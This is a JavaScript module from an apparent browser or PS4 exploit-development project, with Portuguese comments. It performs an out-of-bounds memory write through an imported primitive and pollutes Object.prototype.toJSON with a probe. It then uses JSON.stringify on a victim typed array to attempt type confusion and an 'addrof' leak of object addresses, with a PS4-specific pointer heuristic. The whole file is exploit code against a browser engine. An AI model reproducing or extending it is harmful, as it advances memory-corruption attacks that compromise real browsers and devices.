// js/script3/testArrayBufferVictimCrash.mjs (v40_RefineC1Addrof)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V40_RC1A = "OriginalHeisenbug_TypedArrayAddrof_v40_RefineC1Addrof";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

// Objetos para vazar serão ArrayBuffer e DataView
let leak_target_buffer_v40 = null;
let leak_target_dataview_v40 = null;

let victim_typed_array_ref_v40 = null;
let probe_call_count_v40 = 0;
let all_probe_interaction_details_v40 = [];
let first_call_details_object_ref_v40 = null;

const PROBE_CALL_LIMIT_V40 = 5;

function toJSON_TA_Probe_RefineC1Addrof() {
    probe_call_count_v40++;
    const call_num = probe_call_count_v40;
    let current_call_details = { // Sempre criar um novo objeto de detalhes para esta chamada
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v40_RefineC1Addrof",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v40),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v40 && first_call_details_object_ref_v40 !== null),
        payload_A_assigned: false, // Flag para indicar se o payload foi atribuído
        payload_B_assigned: false,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1DetailsObj? ${current_call_details.this_is_C1_details_obj}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V40) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v40.push(current_call_details);
            return { recursion_stopped_v40: true, call: call_num };
        }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating and returning C1_details object.`, "info");
            first_call_details_object_ref_v40 = current_call_details; // Global aponta para C1_details
            all_probe_interaction_details_v40.push(current_call_details);
            return current_call_details;
        } else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS_OBJECT ('this')! Attempting to assign leak targets...`, "vuln");

            if (leak_target_buffer_v40) {
                this.payload_A = leak_target_buffer_v40; // Atribui ArrayBuffer
                current_call_details.payload_A_assigned = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned leak_target_buffer_v40 to C1_details.payload_A.`, "info");
            }
            if (leak_target_dataview_v40) {
                this.payload_B = leak_target_dataview_v40; // Atribui DataView
                current_call_details.payload_B_assigned = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned leak_target_dataview_v40 to C1_details.payload_B.`, "info");
            }

            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: C1_details modified. Keys: ${Object.keys(this).join(',')}`, "info");

            all_probe_interaction_details_v40.push(current_call_details);
            return this; // Retornar o 'this' modificado (C1_details modificado)
        } else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected or not confused as C1_details. Type: ${current_call_details.this_type}`, "warn");
            all_probe_interaction_details_v40.push(current_call_details);
            return { generic_marker_v40: call_num };
        }

    } catch (e) {
        current_call_details.error_in_probe = e.message;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
        all_probe_interaction_details_v40.push(current_call_details);
        return { error_marker_v40: call_num };
    }
}

export async function executeTypedArrayVictimAddrofTest_RefineC1Addrof() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V40_RC1A}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (RefineC1Addrof) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V40_RC1A} Init...`;

    probe_call_count_v40 = 0;
    all_probe_interaction_details_v40 = [];
    victim_typed_array_ref_v40 = null;
    first_call_details_object_ref_v40 = null;

    // Criando os objetos a vazar: um ArrayBuffer e uma DataView
    leak_target_buffer_v40 = new ArrayBuffer(0x10); // Pequeno buffer
    leak_target_dataview_v40 = new DataView(new ArrayBuffer(0x10)); // Pequena DataView

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null;
    let details_of_C1_call_after_modification = null;

    let addrof_A = { success: false, msg: "Addrof ArrayBuffer: Default" };
    let addrof_B = { success: false, msg: "Addrof DataView: Default" };
    const fillPattern = 0.40404040404040;

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v40 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v40.buffer);
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v40 (Uint8Array) created. Its buffer filled.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_RefineC1Addrof, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v40)...`, "info", FNAME_CURRENT_TEST);
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v40);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);

            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Output was: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }

            if (first_call_details_object_ref_v40) {
                try {
                    details_of_C1_call_after_modification = JSON.parse(JSON.stringify(first_call_details_object_ref_v40));
                } catch (e_circular) {
                    logS3(`  Warning: Could not capture C1_details snapshot due to circular reference: ${e_circular.message}`, "warn", FNAME_CURRENT_TEST);
                    details_of_C1_call_after_modification = { snapshot_error: e_circular.message };
                }
            }
            logS3(`  EXECUTE: Captured state of C1_details object AFTER all probe calls: ${details_of_C1_call_after_modification ? JSON.stringify(details_of_C1_call_after_modification) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugOnC1 = false;
            const call2Details = all_probe_interaction_details_v40.find(d => d.call_number === 2);
            if (call2Details && call2Details.this_is_C1_details_obj && call2Details.payload_A_assigned) {
                heisenbugOnC1 = true;
                logS3(`  EXECUTE: HEISENBUG & PAYLOAD ASSIGNMENT on C1_details CONFIRMED by probe Call #2!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug/Payload Assignment on C1_details NOT confirmed as expected by probe Call #2.`, "error", FNAME_CURRENT_TEST);
            }

            logS3("STEP 3: Checking stringifyOutput_parsed (the C1_details object) for leaked payloads...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.call_number === 1) { // Verifica se é o C1_details original
                const payload_A_val = stringifyOutput_parsed.payload_A;
                if (typeof payload_A_val === 'number' && payload_A_val !== 0 && !isNaN(payload_A_val)) {
                    let pA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_A_val]).buffer)[0], new Uint32Array(new Float64Array([payload_A_val]).buffer)[1]);
                    // Heurística de ponteiro para PS4 (endereços de heap geralmente começam com 0x8...)
                    if (pA_int64.high() > 0x70000000 || pA_int64.low() > 0x10000000 || (pA_int64.high() & 0xFF000000) === 0x80000000) {
                        addrof_A.success = true; addrof_A.msg = `Possible pointer for ArrayBuffer: ${pA_int64.toString(true)}`;
                    } else { addrof_A.msg = `ArrayBuffer payload is num but not ptr: ${payload_A_val} (Raw Float: ${payload_A_val})`; }
                } else if (payload_A_val instanceof ArrayBuffer) {
                    addrof_A.msg = `ArrayBuffer payload found as ArrayBuffer object directly (not numeric pointer).`;
                } else { addrof_A.msg = `ArrayBuffer payload not a useful number or object: ${JSON.stringify(payload_A_val)}`; }


                const payload_B_val = stringifyOutput_parsed.payload_B;
                if (typeof payload_B_val === 'number' && payload_B_val !== 0 && !isNaN(payload_B_val)) {
                    let pB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_B_val]).buffer)[0], new Uint32Array(new Float64Array([payload_B_val]).buffer)[1]);
                    if (pB_int64.high() > 0x70000000 || pB_int64.low() > 0x10000000 || (pB_int64.high() & 0xFF000000) === 0x80000000) {
                        addrof_B.success = true; addrof_B.msg = `Possible pointer for DataView: ${pB_int64.toString(true)}`;
                    } else { addrof_B.msg = `DataView payload is num but not ptr: ${payload_B_val}`; }
                } else if (payload_B_val instanceof DataView) {
                    addrof_B.msg = `DataView payload found as DataView object directly (not numeric pointer).`;
                } else { addrof_B.msg = `DataView payload not a useful number or object: ${JSON.stringify(payload_B_val)}`; }

            } else {
                addrof_A.msg = "stringifyOutput was not the expected C1_details object or payload_A not found.";
                addrof_B.msg = "stringifyOutput was not the expected C1_details object or payload_B not found.";
                logS3(`  stringifyOutput_parsed type: ${typeof stringifyOutput_parsed}, content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn");
            }

            if (addrof_A.success || addrof_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V40_RC1A}: Addr SUCCESS!`;
            } else if (heisenbugOnC1) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V40_RC1A}: C1_TC OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V40_RC1A}: No C1_TC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V40_RC1A}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_outer_main.name} - ${e_outer_main.message}${e_outer_main.stack ? '\n'+e_outer_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V40_RC1A} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v40}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v40 = null;
        all_probe_interaction_details_v40 = [];
        probe_call_count_v40 = 0;
        first_call_details_object_ref_v40 = null;
        leak_target_buffer_v40 = null; // Limpar referências
        leak_target_dataview_v40 = null; // Limpar referências
    }
    return {
        errorCapturedMain: errorCapturedMain,
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError',
        stringifyResult: stringifyOutput_parsed,
        toJSON_details: details_of_C1_call_after_modification,
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v40],
        total_probe_calls: probe_call_count_v40,
        addrof_A_result: addrof_A,
        addrof_B_result: addrof_B
    };
}
